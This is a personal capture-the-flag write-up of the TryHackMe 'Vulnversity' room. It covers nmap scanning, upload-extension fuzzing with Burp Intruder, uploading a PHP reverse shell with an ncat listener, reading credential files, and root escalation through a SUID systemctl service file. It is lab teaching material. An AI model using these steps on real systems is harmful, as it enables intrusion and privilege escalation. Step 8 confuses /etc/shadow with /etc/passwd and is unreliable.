# Vulnversity: BurpSuite, Nmap, GTFOBins, systemctl, SUID

Recently I performed the ***Vulnversity*** challenge on TryHackMe. The following tools were utilized:
- Burp Suite on https://portswigger.net/burp
- Nmap on https://nmap.org/book/man.html
- GTFOBins on https://gtfobins.github.io/ and systemctl [SUID] on https://gtfobins.github.io/gtfobins/systemctl/

1. As usual, Nmap was performed on the target machine. The following syntax was utilized:
   $${\color{red}nmap \space\color{lightgreen} \space\color{lightblue} \space\color{lightgreen}-sV \space\color{lightblue}-p-5000 \space\color{lightgreen}-v \space\color{lightblue}-oN \space vulnersity \space\color{orange}10.10.85.178}$$

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-12%20171223.png)
   
   The ***-sV -p -oN*** options were explained on https://github.com/jtoalu/Nmap-Wreath 
   
   Verbose mode is enabled by ***-v*** option. Features such as the extra OS identification data, completion time estimates, open port alerts, and extra informational messages are easily identified in the output with verbosity enabled. This extra info is often helpful during interactive scanning. It gives hints/clues whether we should continue the scanning or not (when we do not know what should be the highest port number to be scanned), so specifying ***-v*** option when scanning a single machine is helpful for us to decide when to stop/terminate the scanning.

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-12%20171449.png)
   
2. The result of the ***nmap*** scanning informed us there is a website on port 3333 on the target machine. Tools such as https://www.kali.org/tools/dirbuster/ and https://www.kali.org/tools/gobuster/ can be utilized to find out any other information about the website. The result contains several information and the /internal is the most useful information on this challenge. After navigating to the ***internal*** folder/path/directory of the website, we found a webpage to upload a file. 

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20232846.png)

We shall utilize ***Burp Suite*** to find out which file extension is accepted to be uploaded through the webpage.

3. We need to setup the ***proxy*** to be utilized by our web browser and Burp Suite.

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20232946.png)

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20233222.png)

4. After completing the setup, we send the web visit on the Burp Suite to the ***intruder*** tool. We create a text file with the following extensions:
.php
.php3
.php4
.php5
.phtml 
and let the ***intruder*** finding out which file extension is accepted to be uploaded through the webpage.

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20232625.png)

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20232644.png)

5. The ***intruder*** informed us that ***.phtml*** is the accepted file extension.

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20232550.png)

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-03%20232608.png)

6. We shall utlize the code on https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php which is provided by [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) to obtain a ***reverse shell***. Save the ***php*** code into a ***.phtml*** file and upload it through the http://MACHINE_IP:3333/internal/ webpage. Do not forget to update the IP Address and port (optional) in the ***php*** code according to the information of our attacking machine.

$ip = '127.0.0.1';  // CHANGE THIS

$port = 1234;       // CHANGE THIS

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-04%20224540.png)

7. After successfully uploading the ***.phtml*** file, open an [Ncat](https://nmap.org/ncat/guide/ncat-usage.html) ***listener*** on our attacking machine for an incoming connection from the target machine. We then execute the uploaded file through http://MACHINE_IP:3333/internal/uploads/php-reverse-shell.phtml 

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-04%20224601.png)

The command ***ncat -lvnp 1234*** is used with the ncat utility, which is part of the nmap suite. Here is a breakdown of what each part of the command means:

-l: This option tells ncat to listen for incoming connections. It sets up a listening mode.
-v: This stands for verbose mode, which provides more detailed output about what ncat is doing.
-n: This option prevents ncat from performing DNS lookups on the specified addresses, which can speed up the connection process.
-p 1234: This specifies the port number 1234 on which ncat will listen for incoming connections.

So, ***ncat -lvnp 1234*** sets up ncat to listen on port 1234, providing verbose output and avoiding DNS lookups. 

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-04%20224050.png)

8. The command ***cat /etc/shadow*** shall display the fundamental component in Linux sytems, serving as a database for all user accounts on the system. It is a plain text file that contains essential information for user authentication and identification. The file is owned by the root user and typically has 644 permissions, meaning it is readable by all system users but only modifiable by root or users with sudo privileges.

Structure and Content of /etc/passwd
- Each line in the /etc/passwd file represents a single user account and contains seven fields separated by colons (:). These fields are as follows:
- Username: The unique user identifier for login.
- Password: A placeholder (usually an x) indicating that the actual encrypted password is stored in the /etc/shadow file.
- UID (User ID): A numerical identifier for the user, with the root user typically having a UID of 0.
- GID (Group ID): A numerical identifier representing the user's primary group.
- GECOS: A comma-separated list providing additional information about the user, such as full name and contact details.
- Home Directory: The absolute path to the user's home directory.
- Login Shell: The absolute path to the user's default shell upon login

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-04%20224144.png)

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-04%20224436.png)

9. Now that we have compromised the target machine, we will escalate our privileges and become the superuser (root). In Linux, ***SUID*** (set owner userId upon execution) is a particular type of file permission given to a file. ***SUID*** gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it). For example, the binary file to change our password has the SUID bit set on it (/usr/bin/passwd). This is because to change our password, we will need to write to the shadowers file that we do not have access to; ***root*** does, so it has ***root*** privileges to make the right changes.

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/suid-linux.png)

10. Execute the following command:

$${\color{red}find \space\color{lightgreen} / \space -user \space root \space -perm \space -4000 \space -exec \space ls \space -ldb}$$ {} \\;

The ***ls*** command in Linux is used to list files and directories. When we use the ***-l, -d, and -b*** options together, each option modifies the output in a specific way:

-l (long listing format): This option provides detailed information about each file or directory, including permissions, number of links, owner, group, size, and timestamp.
-d (directory): Normally, ls lists the contents of directories. With the -d option, ls will list the directory itself, not its contents.
-b (escape): This option prints non-printable characters in file names as backslash-escaped characters.

So, ***ls -ldb*** will list directories themselves (not their contents) in a long format, with non-printable characters in file names escaped.

Privilege escalation using the find command with the ***-perm -4000*** option is a common technique in Linux environments. The ***-perm -4000*** option in the find command is used to search for files with the ***SUID*** (Set User ID) bit set. When a file has the SUID bit set, it allows users to execute the file with the permissions of the file’s owner, which is often the ***root*** user. This can be exploited to escalate privileges if the file is vulnerable.

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-08%20183406.png)

11. The ouput shows the ***/bin/systemctl*** is an ***SUID*** file and we can obtain a ***root*** access through https://gtfobins.github.io/gtfobins/systemctl/ 

Execute the following command:

TF=$(mktemp).service  
echo '[Service]  
Type=oneshot  
ExecStart=/bin/sh -c "id > /tmp/output"  
[Install]  
WantedBy=multi-user.target' > $TF  
sudo systemctl link $TF  
sudo systemctl enable --now $TF

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-12%20100037.png)

![](https://github.com/jtoalu/Vulnversity-BurpSuite-Nmap-GTFOBins-systemctl/blob/main/Screenshot%202024-08-12%20100525.png)

Note to Self: https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax and https://stackoverflow.com/questions/11509830/how-to-add-color-to-githubs-readme-md-file
